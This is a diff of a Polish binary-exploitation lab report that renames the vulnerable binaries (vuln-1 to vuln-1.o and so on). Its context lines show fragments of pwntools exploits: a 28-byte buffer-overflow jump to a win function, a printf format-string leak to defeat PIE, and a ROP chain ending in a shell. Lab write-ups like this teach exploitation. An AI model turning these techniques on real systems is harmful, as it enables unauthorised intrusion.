@@ -133,7 +133,7 @@ W przypadku każdego z popunktów padding jest identyczny i wynosi 28 znaków. J
 --------------
 PLIKI:
 1. `vuln.c`
-2. `vuln-1`
+2. `vuln-1.o`
 3. `exploit-1.py`
 -------------
 
@@ -150,7 +150,7 @@ Kod prostego exploitu znajduje się poniżej.
 
 from pwn import *
 
-p = process('./vuln-1')
+p = process('./vuln-1.o')
 
 send = b"A" * 28 + p32(0x08049192)
 p.sendline(b"")
@@ -174,7 +174,7 @@ W wyniku poniższego exploitu dostajemy shella.
 --------------
 PLIKI:
 1. `vuln.c`
-2. `vuln-2`
+2. `vuln-2.o`
 3. `exploit-2.py`
 -------------
 
@@ -189,7 +189,7 @@ Base addres można poznać uruchamiając aplikację w `gdb` i używając komendy
 
 from pwn import *
 
-p = process('./vuln-2')
+p = process('./vuln-2.o')
 
 base_addres = 0x56555000
 
@@ -220,7 +220,7 @@ W wyniku poniższego exploitu dostajemy shella.
 --------------
 PLIKI:
 1. `vuln.c`
-2. `vuln-1`
+2. `vuln-1.o`
 3. `exploit-1.py`
 -------------
 
@@ -235,13 +235,9 @@ W takiej konfiguracji atak opisany, tak jak w podpunkcie `a)` jest identyczny. D
 --------------
 PLIKI:
 1. `vuln.c`
-2. `vuln-2`
+2. `vuln-2.o`
 3. `exploit-3.py`
 -------------
-
-LIKI:
-* vuln-protected-2 
-* exploit-protected-3.py
 
 W takim przypadku takim, wszystkie segmenty pamięci są losowane. Skok do funkcji `win` jest niemalże niemożliwy jeżeli nie zleakujemy adresu bazowego PIE. Możliwe jest to tylko jeżeli występuje podatność pozwalająca leakować pamieć.
 
@@ -250,7 +246,7 @@ Do wyleakowania adresów na stosie używam podatności funkcji `printf`, która 
 ```python
 from pwn import *
 
-p = process('./vuln-2')
+p = process('./vuln-2.o')
 
 p.sendline("%p" * 7)
 
@@ -275,7 +271,7 @@ Zatem aby uzyskać adres `win` należy odjąc offset od zleakowanej instrukcji. 
 
 from pwn import *
 
-p = process('./vuln-2')
+p = process('./vuln-2.o')
 
 p.sendline("%p" * 7)
 
@@ -341,7 +337,7 @@ Kod aplikacji jest ten sam co we wszytskich punktach. Wykorzystywanymi podantoś
 --------------
 PLIKI:
 1. `vuln.c`
-2. `vuln-3`
+2. `vuln-3.o`
 3. `exploit-4.py`
 -------------
 
@@ -462,7 +458,7 @@ shellcode = b''.join([
     int80()
 ])
 
-p = process('./vuln-3')
+p = process('./vuln-3.o')
 
 p.sendline(b"")
 p.sendline(shellcode)
@@ -490,7 +486,7 @@ W wyniku powyższego exlpoitu uzyskuję shella.
 -------------
 Pliki:
 1. `vuln.c`
-2. `vuln-4`
+2. `vuln-4.o`
 3. `exploit-5.py`
 
 Exploitacja programu z `PIE` jest o tyle trudniejsza, ponieważ sekcja text jest równiez ruchoma. Aby odnaleźć offset, dzięki któremu wiem gdzie znajdują się wszytskie isntrukcji posłużyłem się identycznym sposobem co w punkcie `5.1 d)` - schemat jak to zrobiłem jest przedstawiony we wskazanym punkcie. 
@@ -583,7 +579,7 @@ def int80():
     return p32(offset + 0x00004862)
 
 
-p = process('./vuln-4')
+p = process('./vuln-4.o')
 
 # retrive offset and buffor addres
 p.sendline("%p" * 7)
